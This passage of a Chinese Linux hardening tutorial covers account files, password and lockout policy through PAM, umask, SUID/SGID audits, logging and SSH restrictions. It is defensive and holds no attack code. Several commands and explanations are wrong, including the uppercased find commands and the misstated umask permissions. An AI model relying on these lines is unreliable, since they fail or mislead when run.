&lt;&#x2F;span&gt;&lt;span&gt;第六字段：提前多少天警告用户口令将过期。
&lt;&#x2F;span&gt;&lt;span&gt;第七字段：在口令过期之后多少天禁用此用户。
&lt;&#x2F;span&gt;&lt;span&gt;第八字段：用户过期日期。
&lt;&#x2F;span&gt;&lt;span&gt;第九字段：保留字段，目前为空。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;etc-group&quot;&gt;&#x2F;etc&#x2F;group&lt;&#x2F;h4&gt;
&lt;p&gt;具有共同特性的用户集合起来就是用户组&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;root:x:0:root,linuxsir,baz
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;第一字段：用户组名称。
&lt;&#x2F;span&gt;&lt;span&gt;第二字段：用户组密码。
&lt;&#x2F;span&gt;&lt;span&gt;第三字段：GID。
&lt;&#x2F;span&gt;&lt;span&gt;第四字段：用户列表，每个用户之间用英文逗号分割。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;etc-gshadow&quot;&gt;&#x2F;etc&#x2F;gshadow&lt;&#x2F;h4&gt;
&lt;p&gt;&#x2F;etc&#x2F;group的加密文件&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;groupname:password:admin,admin,...:member,member,...
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;第一字段：用户组。
&lt;&#x2F;span&gt;&lt;span&gt;第二字段：用户组密码。
&lt;&#x2F;span&gt;&lt;span&gt;第三字段：用户组管理者。
&lt;&#x2F;span&gt;&lt;span&gt;第四字段：用户组成员。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;c-zhang-hu-ren-zheng-fang-shi&quot;&gt;c·账户认证方式&lt;&#x2F;h3&gt;
&lt;p&gt;本地认证、远程认证。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;用户名+密码（SSH、Telnet、FTP）。&lt;&#x2F;li&gt;
&lt;li&gt;基于证书。&lt;&#x2F;li&gt;
&lt;li&gt;PAM（Pluggable Authentication Modules）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467766983-210233f5-7bc9-479a-a1ec-6254bc374f72.png#align=left&amp;amp;display=inline&amp;amp;height=254&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=508&amp;amp;originWidth=810&amp;amp;size=262688&amp;amp;status=done&amp;amp;style=none&amp;amp;width=405&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;d-zhang-hu-fang-wen-wen-jian-quan-xian-fen-pei&quot;&gt;d·账户访问文件权限分配&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;drwxr-xr-x 2 root root 637 Sep 19 03:23 config
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;d：文件类型：d文件夹，-文件。
&lt;&#x2F;span&gt;&lt;span&gt;rwx：文件拥有者的权限（U）。
&lt;&#x2F;span&gt;&lt;span&gt;r-x：文件拥有者所在组其他用户的权限（G）。
&lt;&#x2F;span&gt;&lt;span&gt;r-x：系统中其他用户的权限（O）。
&lt;&#x2F;span&gt;&lt;span&gt;2：链接数。
&lt;&#x2F;span&gt;&lt;span&gt;root：文件拥有者UID。
&lt;&#x2F;span&gt;&lt;span&gt;root：文件拥有者GID。
&lt;&#x2F;span&gt;&lt;span&gt;673：文件大小。
&lt;&#x2F;span&gt;&lt;span&gt;Sep 19 03:23：最后修改时间。
&lt;&#x2F;span&gt;&lt;span&gt;config：文件名。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;quan-xian-biao-shi-fang-shi&quot;&gt;权限表示方式&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467829710-9211d308-68bd-4e07-9ac4-52a37d54d2fa.png#align=left&amp;amp;display=inline&amp;amp;height=254&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=508&amp;amp;originWidth=1318&amp;amp;size=532634&amp;amp;status=done&amp;amp;style=none&amp;amp;width=659&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;r、w、x分别表示读、写、执行。&lt;br &#x2F;&gt;r、w、x分别可以用4、2、1表示。&lt;br &#x2F;&gt;例如：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; 777 config    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#给文件设置权限
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; u=rwx config    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#给文件设置权限
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;特殊权限：&lt;br &#x2F;&gt;SUID&#x2F;SGID&#x2F;SBIT&lt;br &#x2F;&gt;&#x2F;usr&#x2F;bin&#x2F;passwd这个文件的权限状态是：“-rwsr-xr-x”&lt;&#x2F;p&gt;
&lt;h2 id=&quot;2-zhang-hu-feng-xian-yu-an-quan-ce-lue&quot;&gt;2·账户风险与安全策略&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;a-shen-fen-jian-bie&quot;&gt;a·身份鉴别&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;te-quan-yong-hu-de-pai-cha&quot;&gt;特权用户的排查：&lt;&#x2F;h4&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;awk -F&lt;&#x2F;span&gt;&lt;span&gt;: &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;($3==0){print$1}&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; &#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;结果中不能出现root以外的UID为0的用户。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467859366-ef649a28-830e-4f37-8c7e-1e7d7684017f.png#align=left&amp;amp;display=inline&amp;amp;height=57&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=114&amp;amp;originWidth=916&amp;amp;size=64258&amp;amp;status=done&amp;amp;style=none&amp;amp;width=458&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467877021-00313415-d9cb-4ceb-ac26-4f20c134b1f2.png#align=left&amp;amp;display=inline&amp;amp;height=245&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=490&amp;amp;originWidth=896&amp;amp;size=137764&amp;amp;status=done&amp;amp;style=none&amp;amp;width=448&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h4 id=&quot;zhang-hao-mi-ma-sheng-ming-zhou-qi&quot;&gt;账号密码生命周期&lt;&#x2F;h4&gt;
&lt;p&gt;对于采用静态口令认证的服务器，账户密码生命周期应小于90，且拒绝弱口令以及空口令。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;more&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;login.defs    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#检查相关参数
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;建议设置如下内容：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;PASS_MAX_DAYS 90    #新建用户的密码最长使用天数
&lt;&#x2F;span&gt;&lt;span&gt;PASS_MIN_DAYS 0    #新建用户的密码最短使用天数
&lt;&#x2F;span&gt;&lt;span&gt;PASS_WARN_AGE 7    #新建用户的密码到期提前提醒天数
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624467916584-bdbee4b1-98a0-4c04-9329-f9862b477149.png#align=left&amp;amp;display=inline&amp;amp;height=155&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=310&amp;amp;originWidth=1146&amp;amp;size=59605&amp;amp;status=done&amp;amp;style=none&amp;amp;width=573&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h4 id=&quot;mi-ma-qiang-du&quot;&gt;密码强度&lt;&#x2F;h4&gt;
&lt;p&gt;对于采用静态口令认证技术的设备，口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号4类中至少2类。&lt;br &#x2F;&gt;&#x2F;etc&#x2F;pam.d&#x2F;system-auth文件中配置：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;password requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;至少8位，包含一位大写字母，一位小写字母和一位数字&lt;&#x2F;p&gt;
&lt;h4 id=&quot;yong-hu-suo-ding&quot;&gt;用户锁定&lt;&#x2F;h4&gt;
&lt;p&gt;对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过10次，锁定该用户使用的账号。&lt;br &#x2F;&gt;设置连续输错10次密码，账号锁定5分钟，使用如下命令修改配置文件&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vi&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;pam.d&#x2F;system-auth
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;添加&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;auth required pam_tally.so onerr=fail deny=10 unlock_time=300
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;注：解锁用户：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;faillog -u &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;用户名&amp;gt; -r
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;b-fang-wen-kong-zhi&quot;&gt;b·访问控制&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;umaskan-quan-pei-zhi&quot;&gt;umask安全配置&lt;&#x2F;h4&gt;
&lt;p&gt;检查umask的值是否是027:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vi&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;login.defs
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;默认情况下umask的值是022（能够用umask命令查看）。&lt;br &#x2F;&gt;此时建立的文件默认权限是644（6-0，6-2，6-2），建立的文件夹默认权限是755（7-0，7-2，7-2）。&lt;br &#x2F;&gt;022表示默认创建新文件夹权限为755 也就是 rxwr-xr-x（所有者全部权限，属组读写，其它人读写）&lt;br &#x2F;&gt;027表示默认创建新文件夹权限为750 也就是rxwr-x---(所有者全部权限，属组读写，其它人无)&lt;&#x2F;p&gt;
&lt;h4 id=&quot;zhong-yao-mu-lu-quan-xian&quot;&gt;重要目录权限&lt;&#x2F;h4&gt;
&lt;p&gt;执行以下命令检查目录和文件的权限设置情况：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;tmp&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;inetd.conf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;shadow
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;group
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;security
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;sevices
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls -l&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;rc*.d
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;对于重要目录，建议执行如下操作：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod -R&lt;&#x2F;span&gt;&lt;span&gt; 750 &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;*
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这样只有root可以读、写和执行这个目录下的脚本。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;cha-kan-wei-shou-quan-de-suid-sgid&quot;&gt;查看未授权的SUID&#x2F;SGID&lt;&#x2F;h4&gt;
&lt;p&gt;SUID&#x2F;SGID的程序在运行时，将有效用户ID改变为该程序的所有者（组）ID。因而可能存在一定的安全隐患，经常性的对比SUID&#x2F;SGID文件列表，以便能够及时发现可疑的后门程序。&lt;br &#x2F;&gt;找出系统中所有含S位的程序，把不必要的S位去掉，或者把根本不用的直接删除，这样可以防止用户滥用及提升权限的可能性，命令如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FIND&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -TYPE&lt;&#x2F;span&gt;&lt;span&gt; F PERM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -4000 -LS    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#查找SUID可执行程序
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FIND&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -TYPE&lt;&#x2F;span&gt;&lt;span&gt; F PERM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -2000 -LS    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#查找SGID程序
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FIND&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -TYPE&lt;&#x2F;span&gt;&lt;span&gt; F PERM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -6000 -LS    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#查找SUID&#x2F;SGID&#x2F;两个都有
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;c-an-quan-shen-ji&quot;&gt;c·安全审计&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;syslogdeng-lu-shi-jian-ji-lu&quot;&gt;-syslog登陆事件记录&lt;&#x2F;h4&gt;
&lt;p&gt;必须要记录所有的登陆事件，执行 &lt;code&gt;vim &#x2F;etc&#x2F;rsyslog.conf&lt;&#x2F;code&gt; ，查看是否有以下配置&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;kern.warning&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*.err&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;authpriv.none&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;@loghost
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*.info&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mail.none&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;authpriv.none&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cron.none&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;@loghost
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*.emerg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;@loghost
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;local7.*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;@loghost
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;she-zhi-historyshi-jian-chuo&quot;&gt;-设置history时间戳&lt;&#x2F;h4&gt;
&lt;p&gt;在问题定位时，我们有时需要查看history命令记录，看是否有删除&#x2F;移动文件、修改配置等误操作 为history命令添上时间记录，可便于分析、定位问题。修改方法如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;vim&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;profile
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;export &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HISTTIMEFORMAT&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;“&lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;F &lt;&#x2F;span&gt;&lt;span&gt;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;T ‘whoami’”
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;执行source&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;profile生效
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624468412637-4ccae778-f3a3-4948-8e4a-329319925159.png#align=left&amp;amp;display=inline&amp;amp;height=108&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=216&amp;amp;originWidth=1684&amp;amp;size=370091&amp;amp;status=done&amp;amp;style=none&amp;amp;width=842&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;d-zi-yuan-kong-zhi&quot;&gt;d·资源控制&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;deng-lu-chao-shi&quot;&gt;-登陆超时&lt;&#x2F;h4&gt;
&lt;p&gt;使用命令“vi &#x2F;etc&#x2F;profile”修改配置文件，添加“TMOUT=”行开头的注释，&lt;br &#x2F;&gt;建议设置为“TMOUT=180”，即超时时间为3分钟。&lt;&#x2F;p&gt;
&lt;h4 id=&quot;xian-zhi-deng-lu&quot;&gt;-限制登录&lt;&#x2F;h4&gt;
&lt;ul&gt;
&lt;li&gt;禁止ROOT用户远程登陆
&lt;ul&gt;
&lt;li&gt;#CAT &#x2F;ETC&#x2F;SSH&#x2F;SSHD_CONFIG&lt;&#x2F;li&gt;
&lt;li&gt;确保PERMITROOTLOGIN为NO&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;限定信任主机
&lt;ul&gt;
&lt;li&gt;#CAT &#x2F;ETC&#x2F;HOSTS.EQUIV&lt;&#x2F;li&gt;
&lt;li&gt;#CAT &#x2F;$HOME&#x2F;.RHOSTS&lt;&#x2F;li&gt;
&lt;li&gt;查看上述两个文件中的主机，删除其中不必要的主机，防止存在多余的信任主机&lt;&#x2F;li&gt;
&lt;li&gt;或直接关闭所有R系列远程服务
&lt;ul&gt;
&lt;li&gt;RLOGIN&lt;&#x2F;li&gt;
&lt;li&gt;RSH&lt;&#x2F;li&gt;
&lt;li&gt;REXEC&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;禁用TELNET,使用SSH进行管理
&lt;ul&gt;
&lt;li&gt;开启SSH服务：#SERVICE SSHD START&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;限制能够登录本机的IP地址
&lt;ul&gt;
&lt;li&gt;#VI &#x2F;ETC&#x2F;SSH&#x2F;SSHD_CONFIG&lt;&#x2F;li&gt;
&lt;li&gt;添加（或修改）：&lt;&#x2F;li&gt;
&lt;li&gt;ALLOWUSERS &lt;a href=&quot;mailto:MARGIN@10.1.1.3&quot;&gt;MARGIN@10.1.1.3&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;允许用户MARGIN通过地址10.1.1.3来登录本机&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;ALLOWUSERS &lt;em&gt;@10.1.&lt;&#x2F;em&gt;.*
&lt;ul&gt;
&lt;li&gt;仅允许10.1.0.0&#x2F;16网段所有用户通过SSH访问。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;xiu-gai-sshduan-kou&quot;&gt;-修改SSH端口&lt;&#x2F;h4&gt;
&lt;ul&gt;
&lt;li&gt;编辑&#x2F;etc&#x2F;ssh&#x2F;sshd_config&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624469059169-91e3369d-a152-48d4-89b0-f4aa2a633468.png#align=left&amp;amp;display=inline&amp;amp;height=147&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=294&amp;amp;originWidth=916&amp;amp;size=229463&amp;amp;status=done&amp;amp;style=none&amp;amp;width=458&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;修改banner信息
&lt;ul&gt;
&lt;li&gt;修改sshd_config
&lt;ul&gt;
&lt;li&gt;&#x2F;etc&#x2F;ssh&#x2F;sshd_config&lt;&#x2F;li&gt;
&lt;li&gt;如存在，则将banner字段设置为NONE&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;查看修改motd：
&lt;ul&gt;
&lt;li&gt;&#x2F;etc&#x2F;motd&lt;&#x2F;li&gt;
&lt;li&gt;查看该文件内容，更新成自己想要添加的内容&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;e-ru-qin-fang-fan&quot;&gt;e·入侵防范&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Linux下的防火墙框架iptables
&lt;ul&gt;
&lt;li&gt;包过滤&lt;&#x2F;li&gt;
&lt;li&gt;NAT&lt;&#x2F;li&gt;
&lt;li&gt;数据包处理&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Iptables 语法
&lt;ul&gt;
&lt;li&gt;Iptables [-t table] command [match][target]&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Iptables 应用
&lt;ul&gt;
&lt;li&gt;iptables -I INPUT -s 192.168.1.0&#x2F;24 -p tcp --dport 22 -j ACCEPT&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;er-wen-jian-xi-tong-an-quan&quot;&gt;二·文件系统安全&lt;&#x2F;h1&gt;
